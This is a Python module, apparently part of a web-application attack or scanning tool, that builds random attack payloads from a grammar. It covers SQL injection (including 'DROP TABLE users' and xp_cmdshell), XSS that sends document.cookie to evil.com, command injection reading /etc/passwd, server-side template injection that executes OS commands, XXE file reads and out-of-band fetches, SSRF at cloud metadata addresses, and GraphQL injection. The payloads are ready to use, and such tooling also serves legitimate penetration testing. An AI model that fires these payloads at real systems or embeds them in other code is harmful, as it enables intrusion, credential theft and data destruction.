"""Custom payload grammar system — context-aware BNF-like attack generation."""

from __future__ import annotations

import random
import re
from dataclasses import dataclass, field


@dataclass
class GrammarRule:
    """A production rule in the payload grammar."""
    symbol: str
    expansions: list[str] = field(default_factory=list)

    def expand(self) -> str:
        return random.choice(self.expansions) if self.expansions else self.symbol


class PayloadGrammar:
    """BNF-like grammar for context-aware payload generation."""

    def __init__(self):
        self._rules: dict[str, GrammarRule] = {}
        self._load_default_grammars()

    def add_rule(self, symbol: str, expansions: list[str]) -> None:
        self._rules[symbol] = GrammarRule(symbol=symbol, expansions=expansions)

    def generate(self, start_symbol: str, max_depth: int = 10) -> str:
        return self._expand(start_symbol, depth=0, max_depth=max_depth)

    def generate_multiple(self, start_symbol: str, count: int = 10, max_depth: int = 10) -> list[str]:
        results: set[str] = set()
        attempts = 0
        while len(results) < count and attempts < count * 5:
            payload = self.generate(start_symbol, max_depth)
            results.add(payload)
            attempts += 1
        return list(results)

    def _expand(self, text: str, depth: int, max_depth: int) -> str:
        if depth >= max_depth:
            # Strip remaining non-terminals
            return re.sub(r"<\w+>", "", text)

        pattern = re.compile(r"<(\w+)>")
        result = text
        for match in pattern.finditer(text):
            symbol = match.group(1)
            if symbol in self._rules:
                expansion = self._rules[symbol].expand()
                result = result.replace(match.group(0), expansion, 1)
                result = self._expand(result, depth + 1, max_depth)
                break  # Re-scan after each replacement

        return result

    def _load_default_grammars(self) -> None:
        """Load built-in grammars for common attack types."""

        # ── SQL Injection grammar ──
        self.add_rule("sqli", [
            "<sqli_prefix><sqli_core><sqli_suffix>",
            "<sqli_union>",
            "<sqli_blind>",
            "<sqli_stacked>",
        ])
        self.add_rule("sqli_prefix", ["'", "\"", "1", "-1", "0", "' ", "\" ", "1 "])
        self.add_rule("sqli_core", [
            "OR <sqli_bool>",
            "AND <sqli_bool>",
            "UNION <sqli_union_body>",
            "; <sqli_stacked_cmd>",
        ])
        self.add_rule("sqli_bool", [
            "1=1", "'1'='1'", "''=''", "1>0", "TRUE", "1 LIKE 1",
        ])
        self.add_rule("sqli_suffix", ["--", "-- -", "#", "/*", ";--", ""])
        self.add_rule("sqli_union", [
            "' UNION SELECT <sqli_columns>--",
            "\" UNION SELECT <sqli_columns>--",
            "-1 UNION ALL SELECT <sqli_columns>--",
        ])
        self.add_rule("sqli_union_body", [
            "SELECT <sqli_columns>",
            "ALL SELECT <sqli_columns>",
        ])
        self.add_rule("sqli_columns", [
            "NULL", "NULL,NULL", "NULL,NULL,NULL",
            "1,2,3", "1,2,3,4,5",
            "@@version,NULL", "user(),NULL", "database(),NULL",
        ])
        self.add_rule("sqli_blind", [
            "' AND SLEEP(<delay>)--",
            "' AND (SELECT * FROM (SELECT SLEEP(<delay>))x)--",
            "'; WAITFOR DELAY '0:0:<delay>'--",
            "' AND IF(1=1,SLEEP(<delay>),0)--",
        ])
        self.add_rule("sqli_stacked", [
            "'; <sqli_stacked_cmd>--",
            "\"; <sqli_stacked_cmd>--",
        ])
        self.add_rule("sqli_stacked_cmd", [
            "DROP TABLE users", "SELECT pg_sleep(<delay>)",
            "EXEC xp_cmdshell('whoami')",
        ])
        self.add_rule("delay", ["3", "5", "7", "10"])

        # ── XSS grammar ──
        self.add_rule("xss", [
            "<xss_tag>",
            "<xss_event>",
            "<xss_uri>",
        ])
        self.add_rule("xss_tag", [
            "<script><xss_js></script>",
            "<img src=x onerror=<xss_js>>",
            "<svg onload=<xss_js>>",
            "<body onload=<xss_js>>",
            "<iframe src='javascript:<xss_js>'>",
            "<details open ontoggle=<xss_js>>",
            "<marquee onstart=<xss_js>>",
        ])
        self.add_rule("xss_js", [
            "alert(1)", "alert(document.cookie)", "alert(document.domain)",
            "fetch('https://evil.com/'+document.cookie)",
            "prompt(1)", "confirm(1)",
        ])
        self.add_rule("xss_event", [
            "\" onfocus=<xss_js> autofocus=\"",
            "' onmouseover=<xss_js> '",
            "\" onload=<xss_js> \"",
        ])
        self.add_rule("xss_uri", [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ])

        # ── Command injection grammar ──
        self.add_rule("cmdi", [
            "<cmdi_sep><cmdi_cmd>",
            "`<cmdi_cmd>`",
            "$(<cmdi_cmd>)",
        ])
        self.add_rule("cmdi_sep", [
            ";", "|", "||", "&&", "\n", "%0a", "$(", "`",
        ])
        self.add_rule("cmdi_cmd", [
            "id", "whoami", "cat /etc/passwd", "ls -la",
            "ping -c 1 127.0.0.1", "sleep <delay>",
            "dir", "type C:\\Windows\\win.ini",
        ])

        # ── SSTI grammar ──
        self.add_rule("ssti", [
            "<ssti_jinja>",
            "<ssti_twig>",
            "<ssti_freemarker>",
            "<ssti_velocity>",
        ])
        self.add_rule("ssti_jinja", [
            "{{7*7}}", "{{config}}", "{{self.__class__.__mro__}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{%import os%}{{os.popen('id').read()}}",
        ])
        self.add_rule("ssti_twig", [
            "{{7*7}}", "{{_self.env.registerUndefinedFilterCallback('exec')}}",
            "{{['id']|filter('system')}}",
        ])
        self.add_rule("ssti_freemarker", [
            "${7*7}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        ])
        self.add_rule("ssti_velocity", [
            "#set($e=\"\")$e.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")",
        ])

        # ── XXE grammar ──
        self.add_rule("xxe", [
            "<xxe_classic>",
            "<xxe_parameter>",
            "<xxe_oob>",
        ])
        self.add_rule("xxe_classic", [
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
        ])
        self.add_rule("xxe_parameter", [
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">%xxe;]><foo>test</foo>",
        ])
        self.add_rule("xxe_oob", [
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/oob\">%xxe;]><foo>test</foo>",
        ])

        # ── SSRF grammar ──
        self.add_rule("ssrf", [
            "<ssrf_internal>",
            "<ssrf_cloud>",
            "<ssrf_bypass>",
        ])
        self.add_rule("ssrf_internal", [
            "http://127.0.0.1:<port>",
            "http://localhost:<port>",
            "http://0.0.0.0:<port>",
            "http://[::1]:<port>",
        ])
        self.add_rule("ssrf_cloud", [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/v1/",
        ])
        self.add_rule("ssrf_bypass", [
            "http://0x7f000001:<port>",
            "http://2130706433:<port>",
            "http://127.1:<port>",
            "http://0177.0.0.1:<port>",
        ])
        self.add_rule("port", ["80", "443", "8080", "8443", "3000", "5000", "6379", "27017"])

        # ── GraphQL grammar ──
        self.add_rule("graphql", [
            "<gql_introspection>",
            "<gql_injection>",
            "<gql_dos>",
        ])
        self.add_rule("gql_introspection", [
            "{__schema{types{name,fields{name,type{name}}}}}",
            "{__type(name:\"User\"){name,fields{name,type{name}}}}",
            "{__schema{queryType{name}mutationType{name}}}",
        ])
        self.add_rule("gql_injection", [
            "{user(id:\"1 OR 1=1\"){name,email}}",
            "{user(id:\"1' UNION SELECT * FROM users--\"){name}}",
        ])
        self.add_rule("gql_dos", [
            "{a:__typename,b:__typename,c:__typename,d:__typename,e:__typename}",
        ])


# ── Convenience ───────────────────────────────────────────────────────

_grammar = PayloadGrammar()


def grammar_generate(attack_type: str, count: int = 10) -> list[str]:
    """Generate payloads using the grammar system for a given attack type."""
    try:
        return _grammar.generate_multiple(attack_type, count=count)
    except Exception:
        return []
